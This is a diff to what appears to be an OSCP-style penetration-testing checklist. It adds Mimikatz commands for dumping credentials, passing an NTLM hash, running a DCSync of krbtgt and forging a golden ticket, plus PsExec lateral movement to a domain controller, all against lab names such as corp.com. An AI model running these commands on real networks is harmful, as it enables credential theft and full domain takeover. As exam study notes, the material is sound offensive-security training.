@@ -2,6 +2,8 @@
 - [Active Directory Enumeration](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#active-directory-enumeration)
   - Kerbrute
   - Rubeus
+  - Roasting
+  - Mimikatz
 - [Lat Move](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md)
 - [Enumerate Services](https://github.com/conma293/OSCP-tools/blob/master/Checklist.md#enumerate-services)
   - [SMB]
@@ -55,8 +57,6 @@ nmap -p445 --scriptsafe
 
 * * *
 
-
-
 #### CHECK FOR EXPLOITS
 - Run ```Searchsploit``` against all enumerated services AND google
 ```site:exploit-db APP VERSION```
@@ -91,9 +91,57 @@ You may already have a shell!
 
 ```john hash.txt```
 
-#### mimikatz
-lsadump
-logonpasswords
+# Mimikatz
+https://adsecurity.org/?page_id=1821
+
+'"privilege::debug" "token::elevate" "lsadump::sam"'
+
+#### Turning an NTLM into TGT:
+```
+privilege::debug
+sekurlsa::logonpasswords
+mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+```
+
+```
+Klist
+Net use //dc1
+Klist
+```
+
+PSEXEC to DC - 
+```.\PsExec.exe \\dc01 cmd.exe```
+
+#### DCSync Attack:
+```lsadump::dcsync /user:Administrator```
+```lsadump::dcsync /user:domain\krbtgt```
+
+
+- Golden:
+Jump to DC to dump krbtgt hash:
+
+psexec.exe \\dc01 cmd.exe
+
+Privilege::debug
+
+lsadump::lsa /patch
+
+
+Back on WKSTN - 
+
+Kerberos::purge
+
+kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
+2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+
+misc::cmd
+
+psexec.exe \\dc01 cmd.exe
+
+-Silver:
+
+
+
 
 #### Lat Move
 ```PsExec.exe -accepteula \\$HOSTNAME cmd```
